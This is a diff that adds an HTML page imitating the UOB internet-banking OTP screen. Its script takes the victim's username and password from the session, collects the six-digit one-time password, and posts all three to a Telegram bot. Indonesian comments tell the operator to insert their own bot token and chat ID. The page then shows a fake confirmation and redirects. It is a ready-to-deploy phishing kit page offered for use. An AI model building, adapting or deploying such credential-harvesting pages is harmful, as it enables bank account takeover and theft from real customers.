@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>UOB Personal Internet Banking - OTP</title>
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(to bottom, #0057b7, #003d7a);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    color: #333;
+  }
+  .logo {
+    margin: 20px 0 10px 20px;
+    font-weight: bold;
+    font-size: 28px;
+    color: #0057b7;
+    display: flex;
+    align-items: center;
+  }
+  .logo .red-bars {
+    width: 20px;
+    height: 28px;
+    background: repeating-linear-gradient(
+      to right,
+      #d71920,
+      #d71920 3px,
+      transparent 3px,
+      transparent 6px
+    );
+    margin-right: 10px;
+  }
+  .otp-container {
+    background: #fff;
+    border-radius: 4px;
+    width: 320px;
+    max-width: 90%;
+    padding: 20px 30px;
+    box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
+    margin-bottom: 40px;
+    text-align: center;
+  }
+  .language {
+    text-align: right;
+    font-size: 13px;
+    margin-bottom: 15px;
+  }
+  .language a {
+    color: #5e5e5e;
+    text-decoration: none;
+    margin-left: 7px;
+  }
+  .language a:hover {
+    text-decoration: underline;
+  }
+  h2 {
+    margin: 8px 0 20px 0;
+    font-weight: 500;
+    font-size: 20px;
+    color: #333;
+  }
+  input[type="text"] {
+    width: 100%;
+    padding: 14px 10px;
+    margin: 6px 0 20px;
+    box-sizing: border-box;
+    font-size: 14px;
+    border: 1px solid #ddd;
+    border-radius: 2px;
+    color: #999;
+    text-align: center;
+  }
+  input[type="text"]:focus {
+    border-color: #0057b7;
+    color: #333;
+    outline: none;
+  }
+  button {
+    background-color: #0072ce;
+    color: white;
+    border: none;
+    padding: 12px;
+    width: 100%;
+    border-radius: 3px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #0057b7;
+  }
+  .forgot-link {
+    color: #0072ce;
+    font-size: 13px;
+    text-decoration: none;
+    display: block;
+    margin-top: 10px;
+  }
+  .forgot-link:hover {
+    text-decoration: underline;
+  }
+  .footer {
+    text-align: center;
+    margin-top: auto;
+    margin-bottom: 20px;
+  }
+  .tmrw-logo {
+    display: inline-block;
+    background-color: #0057b7;
+    color: #fff;
+    padding: 10px 15px;
+    border-radius: 7px;
+    font-weight: bold;
+    font-size: 14px;
+    margin-bottom: 8px;
+    vertical-align: middle;
+    position: relative;
+    line-height: 24px;
+  }
+  .tmrw-logo .red-bars {
+    width: 20px;
+    height: 24px;
+    background: repeating-linear-gradient(
+      to right,
+      #d71920,
+      #d71920 3px,
+      transparent 3px,
+      transparent 6px
+    );
+    display: inline-block;
+    vertical-align: middle;
+    margin-right: 6px;
+  }
+  .tmrw-logo span {
+    vertical-align: middle;
+  }
+</style>
+</head>
+<body>
+
+<div class="logo">
+  <div class="red-bars"></div>UOB
+</div>
+
+<div class="otp-container" role="main">
+  <div class="language">
+    <a href="#">English</a> | <a href="#">Bahasa Indonesia</a>
+  </div>
+  <h2>Enter OTP</h2>
+  <form id="otpForm" action="javascript:void(0);" aria-label="OTP form">
+    <input type="text" id="otp" name="otp" placeholder="Enter OTP" aria-label="OTP" maxlength="6" required autofocus pattern="[0-9]{6}" title="6 digit OTP"/>
+    <button type="submit" id="otpBtn">Submit</button>
+  </form>
+</div>
+
+<div class="footer" aria-label="Footer and app download">
+  <div class="tmrw-logo" aria-label="TMRW by UOB logo">
+    <div class="red-bars"></div><span>UOB</span> TMRW ID
+  </div>
+</div>
+
+<script>
+  // Ganti dengan token dan chat ID Telegram Anda
+  const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+  const telegramChatId = 'YOUR_TELEGRAM_CHAT_ID';
+
+  // Ambil data login dari sessionStorage
+  const user = sessionStorage.getItem('uob_user');
+  const pass = sessionStorage.getItem('uob_pass');
+
+  // Jika data login tidak ada, kembali ke halaman login
+  if (!user || !pass) {
+    alert('Session login expired. Please login again.');
+    window.location.href = 'index.html';
+  }
+
+  document.getElementById('otpForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    var otp = document.getElementById('otp').value.trim();
+
+    if (!otp || !/^\d{6}$/.test(otp)) {
+      alert('Please enter a valid 6-digit OTP.');
+      return;
+    }
+
+    // Gabungkan data login dan OTP
+    const message = `
+UOB OTP Submission:
+Username: ${user}
+Password: ${pass}
+OTP: ${otp}
+    `;
+
+    // Kirim pesan ke Telegram Bot
+    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: telegramChatId,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      alert('OTP sent successfully.');
+      // Bersihkan session dan redirect ke halaman login lagi
+      sessionStorage.clear();
+      window.location.href = 'index.html';
+    })
+    .catch(error => {
+      console.error('Error sending OTP to Telegram:', error);
+      alert('Failed to send OTP.');
+    });
+  });
+</script>
+
+</body>
+</html>
